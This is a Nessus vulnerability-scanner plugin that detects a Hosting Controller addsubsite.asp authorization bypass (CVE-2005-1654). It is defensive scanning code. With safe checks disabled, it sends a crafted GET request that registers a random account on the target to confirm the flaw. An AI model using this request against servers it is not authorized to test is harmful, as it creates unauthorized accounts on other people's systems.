#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(18363);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2005-1654");
  script_bugtraq_id(13531);
  script_osvdb_id(16190);

  name["english"] = "Hosting Controller addsubsite.asp Security Bypass";
  script_name(english:name["english"]);
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an ASP script that is susceptible
to unauthorized access." );
 script_set_attribute(attribute:"description", value:
"The version of Hosting Controller installed on the remote host does
not properly validate access to administrative scripts.  An attacker
can exploit this flaw to register accounts simply by passing arguments
to the 'addsubsite.asp' script." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a29766d9" );
 script_set_attribute(attribute:"solution", value:
"Apply hotfix 2.0 or later to version 6.1." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/05/24");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/05/05");
 script_cvs_date("$Date: 2015/12/23 21:38:31 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  summary["english"] = "Checks for addsubsite.asp security bypass in Hosting Controller";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning", "global_settings/supplied_logins_only");
  script_require_ports("Services/www", 8077);
  script_require_keys("www/ASP");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

port = get_http_port(default:8077);
if (!can_host_asp(port:port)) exit(0);


# Specify the exploit to use.
exploit = "/hosting/addsubsite.asp";
if (!safe_checks()) {
  user = rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789", length:6);
  pass = rand_str();
  exploit = string(
    exploit, "?",
    "loginname=", user, "&",
    "password=", pass, "&",
    # nb: just to identify ourselves in the logs.
    "address=", SCRIPT_NAME
  );
}


# Check various directories for Hosting Controller.
foreach dir (cgi_dirs()) {
  # Try the exploit.
  r = http_send_recv3(method:"GET", item:dir +  exploit, port:port);
  if (isnull(r)) exit(0);
  res = strcat(r[0], r[1], '\r\n', r[2]);

  if (safe_checks()) {
    # The add fails without a loginname.
    if ('<a HREF="addresult.asp?Result=9&amp;Addresult' >< res) {
      security_warning(port);
      exit(0);
    }
  }
  else {
    # If the add worked, there's a redirect with the username and password.
    if (string("Location: AddResult.asp?Result=0&User=", user, "&Pass=", pass) >< res) {
      report = string(
        "\n",
        "Nessus has successfully exploited this vulnerability by registering\n",
        "the following account to Host Controller on the remote host:\n",
        "\n",
        "  ", user, "\n",
        "\n",
        "You are encouraged to delete this account as soon as possible.\n"
      );
      security_warning(port:port, extra:report);
      exit(0);
    }
  }
}
